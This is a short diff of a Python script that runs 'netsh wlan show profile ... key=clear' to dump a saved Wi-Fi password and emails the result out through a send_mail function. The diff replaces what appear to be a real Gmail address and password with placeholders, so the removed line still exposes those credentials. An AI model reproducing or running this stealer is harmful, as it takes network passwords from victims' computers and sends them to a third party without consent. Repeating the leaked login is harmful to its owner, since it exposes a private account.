@@ -10,4 +10,4 @@ def send_mail(email,password,message):
 
 command = "netsh wlan show profile vivo1723 key=clear"
 result = subprocess.check_output(command,shell=True)
-send_mail("devendrajohari9@gmail.com","Yashaswidev0608",result)
+send_mail("email","password",result)
